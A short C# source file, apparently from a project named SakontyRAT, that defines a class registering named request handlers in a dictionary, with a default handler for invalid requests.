using System;
using System.Collections.Generic;
using System.Text;

namespace SakontyRAT.Network
{
    public class SakontyResourceLocator
    {
        private Dictionary<string, IRequestHandler> _requestHandlers;

        public SakontyResourceLocator()
        {
            _requestHandlers = new Dictionary<string, IRequestHandler>();
            this.AddRequestHanlder(new InvalidRequestHandler());
        }

        /// <summary>
        /// Add new IRequestHandler Instance
        /// </summary>
        /// <param name="requestHandler"></param>
        public void AddRequestHanlder(IRequestHandler requestHandler)
        {
            if (!_requestHandlers.ContainsKey(requestHandler.GetName()))
            {
                _requestHandlers.Add(requestHandler.GetName(), requestHandler);
            }
            else
            {
                _requestHandlers[requestHandler.GetName()] = requestHandler;
            }
        }
    }
}